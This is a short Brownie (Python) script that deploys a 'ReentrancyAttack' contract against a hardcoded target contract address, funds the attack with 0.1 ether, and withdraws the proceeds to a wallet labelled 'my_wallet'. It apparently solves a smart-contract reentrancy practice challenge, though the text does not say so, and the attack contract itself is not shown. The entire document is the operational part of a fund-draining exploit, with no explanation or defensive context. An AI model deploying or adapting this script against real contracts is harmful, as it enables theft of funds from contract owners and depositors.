from scripts.helpful_scripts import get_account
from brownie import ReentrancyAttack


def main():
    deploy()

    account = get_account()
    reentrancy_attack = ReentrancyAttack[-1]

    tx1 = reentrancy_attack.attack({"from": account, "value": 0.1e18})
    tx1.wait(1)

    tx2 = reentrancy_attack.withdraw({"from": account})
    tx2.wait(1)


def deploy():
    account = get_account()
    reentrance_addr = "0xE93e546B713c2B29De18EfbF36AED1c78fda52dE"
    my_wallet = "0x65C4999968db9EC4e41b9DBb40691132F407EE95"
    ReentrancyAttack.deploy(reentrance_addr, my_wallet, {"from": account})
